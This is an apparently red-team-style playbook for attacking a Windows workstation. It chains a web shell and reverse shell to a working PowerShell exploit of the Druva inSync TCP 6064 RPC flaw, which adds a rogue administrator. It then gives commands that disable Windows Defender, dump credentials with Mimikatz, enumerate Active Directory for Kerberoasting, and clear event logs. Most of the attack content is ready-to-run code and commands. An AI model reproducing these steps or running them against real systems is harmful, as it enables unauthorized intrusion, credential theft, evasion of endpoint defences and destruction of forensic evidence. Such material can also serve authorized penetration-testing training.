## Attack Chain: Web Foothold -> Druva inSync LPE -> Credential Harvesting

**Primary Goal:** Establish an initial foothold via web application vulnerabilities, escalate to SYSTEM using a local Druva inSync service vulnerability (TCP 6064), and extract credentials from memory for further domain lateral movement.

**TL;DR:** This playbook demonstrates a complete attack chain against a Windows workstation (e.g., WS01). It begins with obtaining a web-based reverse shell, leverages a known local privilege escalation vulnerability in the Druva inSync client (v6.6.3 or below) via an unauthenticated RPC call, disables local endpoint protections, and dumps memory using Mimikatz to facilitate a pivot into Active Directory.

### High-Level Attack Flow

1. **Initial Access:** Exploit a web application vulnerability to upload a web shell and execute a reverse shell payload.
2. **Local Enumeration:** Identify the vulnerable Druva inSync service listening locally on TCP port 6064.
3. **Privilege Escalation:** Execute a custom PowerShell socket payload to interact with the service and execute commands as SYSTEM (e.g., creating a rogue local administrator).
4. **Defense Evasion:** Temporarily disable Windows Defender to permit the execution of post-exploitation tooling.
5. **Credential Harvesting:** Execute Mimikatz to extract SAM hashes, LSA Secrets, and plaintext Logon Passwords.
6. **Domain Reconnaissance:** Enumerate Active Directory to identify pivot targets (Domain Admins, Domain Controllers, SPNs).

### Step 1: Initial Foothold (Web Vector)

Begin by targeting a vulnerable web application (e.g., Drupal, or an outdated XAMPP-hosted site) to gain an initial, unprivileged shell on the workstation.

- **Upload Web Shell:** Upload a simple PHP/ASPX shell to verify Remote Code Execution (RCE).
- **Trigger Reverse Shell:** Execute a PowerShell one-liner or a staged executable to catch an interactive shell on your attack infrastructure.
  - *Tip:* Bind your listener to Port 443 or 80 to bypass basic outbound egress firewall rules.

### Step 2: Local Privilege Escalation (Druva inSync)

The Druva inSync client (v6.6.3 and below) is vulnerable because it listens on **TCP 6064** locally and processes remote procedure calls (RPC) as `SYSTEM` without requiring authentication.

**1. Verify the Vulnerable Service:**

```
netstat -ano | findstr 6064
```

**2. Execute the Exploit:**

Use the following PowerShell script to hijack the RPC call. This payload sends a command formatted for the vulnerable service, instructing it to create a new local administrator account.

```
$ErrorActionPreference = "Stop"

# Command to execute as SYSTEM
$cmd = "net user jonny Password123! /add && net localgroup administrators jonny /add"

# Build the payload specific to the Druva inSync vulnerability
$payload = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]") `
    + [byte[]](@([char]0x00, [char]0x00, [char]0x00, [char]0x00)) `
    + [System.Text.Encoding]::UTF8.GetBytes($cmd)

# Open the socket and fire the payload
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)
$s.Send($payload)
$s.Close()
```

### Step 3: Post-Exploitation & Credential Harvesting

Once you have an Administrative shell (via your new `jonny` user or a direct SYSTEM shell), you must disable the local antivirus to execute credential dumping tools.

**1. Disable Windows Defender (Requires Admin/SYSTEM):**

```
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
```

**2. Mimikatz Execution:**

Transfer `mimikatz.exe` (obfuscated or via memory injection) and dump the memory for domain credentials:

```
:: Gain Debug Privileges
privilege::debug

:: Dump SAM (Local Hashes)
lsadump::sam

:: Dump LSA Secrets (Cached service accounts/GPP)
lsadump::secrets

:: Dump Logon Passwords (WDigest/Cleartext if enabled)
sekurlsa::logonpasswords
```

### Step 4: Domain Reconnaissance (The Pivot)

With credentials in hand, look for indicators of Active Directory membership to plan your lateral movement.

```
:: Check Domain Membership
systeminfo | findstr /B /C:"Domain"

:: List Domain Admins
net group "Domain Admins" /domain

:: Check for Service Principal Names (Kerberoasting)
setspn -T domain.local -Q */*
```

## Operational Security (OPSEC) Considerations & Cleanup

### Red Flags to Watch For

- **Anomalous Account Creation:** The sudden creation of the `jonny` user and addition to the local Administrators group is highly visible in Event Logs (Event ID 4720 and 4732).
- **Defender Tampering:** Disabling Windows Defender via `Set-MpPreference` generates critical alerts in modern EDR/XDR environments.
- **Mimikatz Artifacts:** LSA access and process injection by Mimikatz are heavily signatured. In a mature environment, opt for offline LSASS dumping rather than running Mimikatz on the live disk.

### Cleanup Procedures

Once domain credentials have been secured and a pivot is established, clean up the workstation footprint:

```
:: Remove the rogue local admin account
net user jonny /delete

:: Re-enable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $false"

:: Clear event logs (Warning: Highly suspicious action)
wevtutil cl System
wevtutil cl Security
```

*Note: In professional engagements, do not clear the Security/System event logs entirely unless explicitly permitted by the Rules of Engagement (RoE), as this is a destructive action.*